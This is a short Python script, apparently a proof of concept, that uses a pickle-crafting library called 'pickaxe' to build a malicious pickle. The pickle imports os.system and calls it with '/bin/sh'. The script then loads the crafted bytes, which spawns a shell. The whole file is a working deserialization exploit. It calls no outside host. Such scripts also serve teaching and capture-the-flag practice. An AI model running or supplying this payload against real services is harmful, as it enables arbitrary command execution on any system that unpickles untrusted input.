import pickle
import pickaxe


s1 = "os"
s2 = "system"
s3 = "/bin/sh"

crafter = pickaxe.AsciiCrafter()
crafter.import_from(s1, s2)


crafter.mark()
crafter.push(s3)
crafter.call_f(1, use_mark=True)

crafter.loads(check_stop=True)